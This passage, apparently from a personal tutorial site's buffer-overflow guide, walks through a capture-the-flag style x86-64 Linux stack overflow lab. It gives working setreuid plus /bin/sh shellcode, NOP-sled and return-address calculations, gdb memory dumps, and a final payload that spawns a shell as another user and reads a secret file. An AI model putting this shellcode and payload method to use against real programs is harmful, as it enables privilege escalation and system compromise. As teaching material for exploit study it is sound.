style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;copyright&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;credits&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">or</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;license&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">for</span><span class="token plain"> more information</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token operator" style="color:rgb(127, 219, 202)">&gt;&gt;</span><span class="token operator" style="color:rgb(127, 219, 202)">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(130, 170, 255)">len</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token number" style="color:rgb(247, 140, 108)">54</span><br></span></code></pre></div></div>
<p>Our new equation is now: <code>NOP + shellcode + pad + return_address = 169</code>, which is <code>NOP + 54 + 15 + 6 = 169</code>, so <code>NOP=94</code>.</p>
<p>Let&#x27;s write our payload against bytes, <code>payload = &#x27;\x90&#x27;*94 + &#x27;\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;\x42&#x27;*15 + &#x27;\x41&#x27;*6</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="nop-sled--return-address">NOP sled + Return Address<a href="#nop-sled--return-address" class="hash-link" aria-label="Direct link to NOP sled + Return Address" title="Direct link to NOP sled + Return Address">‚Äã</a></h3>
<p>The 6 * <code>\x41</code>&#x27;s at the end are just a place holder for the return address we want- which is the address of the start of our shellcode.</p>
<p>How we find the a return address that will hit the start of our shellcode?</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;\x90&#x27;*94 + &#x27;\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;\x42&#x27;*15 + &#x27;A&#x27;*6&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c &quot;print &#x27;\x90&#x27;*94 + &#x27;\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;\x42&#x27;*15 + &#x27;A&#x27;*6&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">new word is doggo1fjqXHj;XH1I//bin/shAPHRWHj&lt;XH1BBBBBBBBBBBBAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000414141414141 in ?? ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) x/100x $rsp-200</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe8c8: 0x004005a9      0x00000000      0xf7ffa268      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe8d8: 0xffffecea      0x00007fff      0x67676f64      0x9090906f</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe8e8: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe8f8: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe908: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe918: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe928: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe938: 0x90909090      0x90909090      0x90909090      0xff319090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe948: 0x03eabf66      0x4858716a      0x050ffe89      0x48583b6a</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe958: 0xb849d231      0x69622f2f      0x68732f6e      0x08e8c149</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe968: 0x89485041      0x485752e7      0x050fe689      0x48583c6a</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe978: 0x050fff31      0x42424242      0x42424242      0x42424242</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe988: 0x41414141      0x00004141      0xffffea88      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe998: 0x00000000      0x00000002      0x004005e0      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9a8: 0xf7a4302a      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9b8: 0xffffea88      0x00007fff      0x00040000      0x00000002</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9c8: 0x004005ac      0x00000000      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9d8: 0x794daa23      0x97320a39      0x00400450      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9e8: 0xffffea80      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9f8: 0x00000000      0x00000000      0xa1edaa23      0x68cdf546</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffea08: 0x2d49aa23      0x68cde5f1      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffea18: 0x00000000      0x00000000      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffea28: 0xffffeaa0      0x00007fff      0xf7ffe130      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffea38: 0xf7de7656      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffea48: 0x00000000      0x00000000      0x00000000      0x00000000</span><br></span></code></pre></div></div>
<p>Pick any address that&#x27;s full of NOPs (\x90) e.g. <code>0x7f ff ff ff e8 f8</code></p>
<p>in little edian format, our return address example would look like this <code>\xf8\xe8\xff\xff\xff\x7f</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="final-payload">Final Payload<a href="#final-payload" class="hash-link" aria-label="Direct link to Final Payload" title="Direct link to Final Payload">‚Äã</a></h3>
<p>Let&#x27;s recap, we now have:</p>
<ol>
<li>the offset (169)</li>
<li>the pad (15)</li>
<li>the NOP sled (94)</li>
<li>our shellcode (54)</li>
<li>the return address that hits the start of our shellcode (6)</li>
</ol>
<p>Payload = <code>&#x27;\x90&#x27;*94 + &#x27;\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;\x42&#x27;*15 + &#x27;\x18\xe9\xff\xff\xff\x7f&#x27;</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="capture-the-flag">Capture the Flag<a href="#capture-the-flag" class="hash-link" aria-label="Direct link to Capture the Flag" title="Direct link to Capture the Flag">‚Äã</a></h3>
<p>We take the Payload from above, and run it on the CLI against the <code>bufferoverflow-2</code> application like so:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">[user1@ip-10-10-50-188 overflow-4]$  ./buffer-overflow-2 $(python -c &quot;print &#x27;\x90&#x27;*94 + &#x27;\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;\x42&#x27;*15 + &#x27;\x18\xe9\xff\xff\xff\x7f&#x27;&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">new word is doggo1fjqXHj;XH1I//bin/shAPHRWHj&lt;XH1BBBBBBBBBBBB</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ id</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">uid=1003(user3) gid=1001(user1) groups=1001(user1)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ cat secret.txt</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">wowanothertime!!</span><br></span></code></pre></div></div>
<p>Success!</p>
<div class="theme-admonition theme-admonition-danger admonition_xJq3 alert alert--danger"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>beware</div><div class="admonitionContent_BuS1"><p>shellcode for <code>setreuid</code> apparently doesn&#x27;t work inside gdb/r2, you must deliver the payload directly to the binary, outside of a debugger.</p></div></div>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;\x90&#x27;*94 + &#x27;\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;\x42&#x27;*15 + &#x27;\x18\xe9\xff\xff\xff\x7f&#x27;&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c &quot;print &#x27;\x90&#x27;*94 + &#x27;\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;\x42&#x27;*15 + &#x27;\x18\xe9\xff\xff\xff\x7f&#x27;&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">new word is doggo1fjqXHj;XH1I//bin/shAPHRWHj&lt;XH1BBBBBBBBBBBB</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">process 3400 is executing new program: /usr/bin/bash</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ id</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Detaching after fork from child process 3406.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">uid=1001(user1) gid=1001(user1) groups=1001(user1)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$</span><br></span></code></pre></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-tags-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/buffer-overflow">buffer-overflow</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/linux">linux</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/x-86-64">x86-64</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/exploitation">exploitation</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/gdb">gdb</a></li></ul></div></div><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/bufferoverflow/2.x86.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">Last updated<!-- --> on <b><time datetime="2026-02-20T20:05:57.000Z" itemprop="dateModified">Feb 20, 2026</time></b> by <b>Ron Amosa</b></span></div></div></footer><div class="newsletterCta_rTTm"><p><span class="emoji_bVKv">üì¨</span> I also write a fortnightly newsletter ‚Äî my thoughts on the machines that educate, empower, and exploit our society.<!-- --> <a href="/subscribe">Subscribe here.</a></p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/hacker/bufferoverflow/windows"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Windows x86-64 Buffer Overflow Exploitation Guide</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/hacker/bufferoverflow/resources"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Buffer Overflow Resources, Tips, and Techniques - Exploitation Learning Materials</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#the-stack" class="table-of-contents__link toc-highlight">The Stack</a><ul><li><a href="#stack-frame" class="table-of-contents__link toc-highlight">Stack Frame</a></li></ul></li><li><a href="#the-overflow" class="table-of-contents__link toc-highlight">The Overflow</a><ul><li><a href="#the-payload" class="table-of-contents__link toc-highlight">The Payload</a></li><li><a href="#find-the-offset" class="table-of-contents__link toc-highlight">Find the Offset</a></li><li><a href="#nop-sled" class="table-of-contents__link toc-highlight">NOP Sled</a></li><li><a href="#shellcode" class="table-of-contents__link toc-highlight">Shellcode</a></li><li><a href="#alignment" class="table-of-contents__link toc-highlight">Alignment</a></li><li><a href="#return-address" class="table-of-contents__link toc-highlight">Return Address</a></li></ul></li><li><a href="#buffer-overflow-1" class="table-of-contents__link toc-highlight">Buffer Overflow #1</a><ul><li><a href="#find-the-offset-1" class="table-of-contents__link toc-highlight">Find the offset</a></li><li><a href="#shellcode--return-address" class="table-of-contents__link toc-highlight">shellcode + return address</a></li><li><a href="#memory-address-math" class="table-of-contents__link toc-highlight">Memory Address Math</a></li><li><a href="#nop-slide-shellcode-address" class="table-of-contents__link toc-highlight">NOP slide shellcode address</a></li><li><a href="#payload--shellcode-return-address" class="table-of-contents__link toc-highlight">payload + shellcode return address</a></li><li><a href="#pwntools-setreuid-shellcode" class="table-of-contents__link toc-highlight">pwntools setreuid shellcode</a></li><li><a href="#debugging-return-address" class="table-of-contents__link toc-highlight">Debugging Return Address</a></li></ul></li><li><a href="#buffer-overflow-2" class="table-of-contents__link toc-highlight">Buffer Overflow #2</a><ul><li><a href="#find-offset" class="table-of-contents__link toc-highlight">Find Offset</a></li><li><a href="#shellcode-1" class="table-of-contents__link toc-highlight">Shellcode</a></li><li><a href="#shellcode--pwntools" class="table-of-contents__link toc-highlight">shellcode + pwntools</a></li><li><a href="#nop-sled--return-address" class="table-of-contents__link toc-highlight">NOP sled + Return Address</a></li><li><a href="#final-payload" class="table-of-contents__link toc-highlight">Final Payload</a></li><li><a href="#capture-the-flag" class="table-of-contents__link toc-highlight">Capture the Flag</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Connect</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://www.linkedin.com/in/ron-amosa/" target="_blank" rel="noopener noreferrer" class="footer__link-item">LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/ronamosa/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://www.youtube.com/@uncommonengineer" target="_blank" rel="noopener noreferrer" class="footer__link-item">YouTube<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Discover</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Analysis &amp; Essays</a></li><li class="footer__item"><a class="footer__link-item" href="/docs">Technical</a></li><li class="footer__item"><a class="footer__link-item" href="/about">About</a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Last updated on Fri Feb 20 2026</div></div></div></footer></div>
</body>
</html>